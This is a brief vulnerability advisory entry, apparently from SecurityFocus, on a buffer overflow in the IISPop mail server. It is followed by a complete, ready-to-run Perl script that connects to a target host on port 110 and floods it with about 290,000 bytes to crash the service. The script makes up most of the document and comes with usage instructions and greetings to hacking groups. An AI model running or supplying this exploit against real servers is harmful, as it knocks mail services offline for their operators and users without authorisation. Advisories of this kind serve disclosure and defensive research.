source: http://www.securityfocus.com/bid/6183/info

IISPop is vulnerable to a denial of service caused by a buffer overflow. By sending an unusually large amount of data to IISPop on TCP port 110, the application will terminate with an access violation. Arbitrary code execution may be possible.

#!/usr/bin/perl -w
# tool : iispdos.pl
# shutdown all version of IISPop
# greetz crack.fr , marocit ,christal
#

use IO::Socket;

$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n-->";
print "\tUsage: perl iispdos.pl <host> \n";
exit;
}

$remo = $ARGV[0];
$buffer = "A" x 289999;

print "\n-->";
print "\tconnection with $remo\n";
unless ($so = IO::Socket::INET->new (Proto => "TCP",
PeerAddr => $remo,
PeerPort
=> "110"))
{
print "-->";
print "\tConnection Failed...\n";
exit;
}
print $so "$buffer\n";
close $so;

print "-->";
print "\tnow test if the distant host is down\n";
exit; 